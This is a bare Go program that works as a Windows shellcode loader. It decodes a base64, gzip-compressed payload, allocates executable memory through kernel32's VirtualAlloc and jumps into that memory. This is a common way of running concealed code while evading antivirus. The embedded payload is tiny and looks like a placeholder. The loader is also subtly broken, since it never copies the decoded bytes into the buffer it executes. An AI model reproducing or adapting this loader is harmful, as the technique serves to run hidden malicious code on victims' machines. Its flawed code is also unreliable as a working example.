package main

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"io/ioutil"
	"syscall"
)

func main() {

	k32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc := k32.MustFindProc("VirtualAlloc")

	data, _ := base64.StdEncoding.DecodeString("H4sIAAAAAAAA/4rMLy1ySSxJ9EgtSgUAAAD//wEAAP//VQyEUwwAAAA=")
	//fmt.Println(data)
	rdata := bytes.NewReader(data)
	r, _ := gzip.NewReader(rdata)
	s, _ := ioutil.ReadAll(r)
	//fmt.Println(string(s))
	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(s)), 0x2000|0x1000, 0x40)
	syscall.Syscall(Addr, 0, 0, 0, 0)
}
